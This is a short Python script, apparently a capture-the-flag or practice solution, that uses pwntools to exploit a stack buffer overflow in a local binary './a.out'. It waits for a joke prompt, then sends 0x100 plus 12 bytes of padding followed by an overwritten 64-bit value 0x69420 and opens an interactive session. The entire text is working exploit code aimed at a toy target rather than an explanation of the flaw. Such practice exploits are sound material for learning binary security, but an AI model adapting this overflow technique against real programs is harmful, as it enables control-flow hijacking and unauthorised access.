import pwn

offset = 12
buffer_size = 0x100 + offset
payload = b"A"*buffer_size + pwn.p64(0x69420)
p = pwn.process("./a.out")
p.recvuntil(b"Now tell me what you want what you really really want!!!!!")
p.sendline(payload)
output = p.recv()
print(output)
#print(p.recv())
p.interactive()
